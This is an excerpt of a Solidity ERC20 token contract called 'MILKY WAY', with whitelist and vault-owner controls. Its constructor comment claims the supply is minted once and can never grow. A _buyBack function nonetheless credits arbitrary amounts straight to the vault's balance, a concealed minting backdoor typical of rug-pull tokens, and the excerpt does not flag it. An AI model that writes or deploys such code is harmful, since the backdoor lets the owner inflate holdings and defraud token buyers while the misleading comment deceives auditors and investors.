...
contract TokenSwap is ERC20, VaultOwned {
    using SafeMath for uint256;
    bool private whitelistOnly;
    mapping(address => bool) public whitelist;

    constructor(address vault_) ERC20('MILKY WAY', 'MILKY WAY') VaultOwned(vault_) {
        whitelistOnly = false;
        whitelist[address(this)] = true;
        whitelist[_msgSender()] = true;
        whitelist[vault_] = true;
        // _mint is an internal function in ERC20.sol that is only called here,
        // and CANNOT be called ever again
        _mint(_msgSender(), 12e6 * 1e18);
    }
    ...
    function recover() external onlyVault {
    ...
    function _buyBack(uint256 amount_) internal virtual {
        _beforeTokenTransfer(address(0), vault(), amount_);
        _balances[vault()] += amount_;
    }
}
